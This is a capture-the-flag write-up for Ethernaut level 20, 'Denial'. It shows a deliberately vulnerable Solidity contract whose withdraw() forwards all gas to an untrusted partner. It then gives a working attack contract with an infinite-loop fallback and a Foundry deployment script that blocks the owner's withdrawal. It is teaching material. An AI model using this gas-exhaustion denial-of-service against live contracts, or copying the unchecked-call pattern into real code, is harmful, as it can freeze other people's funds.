# Ethernaut CTF Writeup

## Level 20 Denial

> 題目: https://ethernaut.openzeppelin.com/level/0x029Ded0Eda5cB2c63D2f33eB2A151Af1F3951068

原始碼:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denial {
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint256 timeLastWithdrawn;
    mapping(address => uint256) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

過關條件: 

- deny the owner from withdrawing funds when they call `withdraw()`

解法：

- withdraw 函數忽略當 partner 是一個具有 fallback 函數的合約，將會耗盡所有 Gas，產生 Denial of Service 的效果

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {Denial} from "../src/level20/Denial.sol";

contract AttackDenial {
    Denial target;

    constructor(Denial _target) {
        target = _target;
        target.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        while(true){}     
    }
}

contract Attack is Script {
    Denial target = Denial(payable(0x1B3dF2D20FDdFa46f955bD755DE115D46C90b057));
    AttackDenial attack;
    function run() public {
        vm.startBroadcast();

        attack = new AttackDenial(target);

        vm.stopBroadcast();
    }
}
```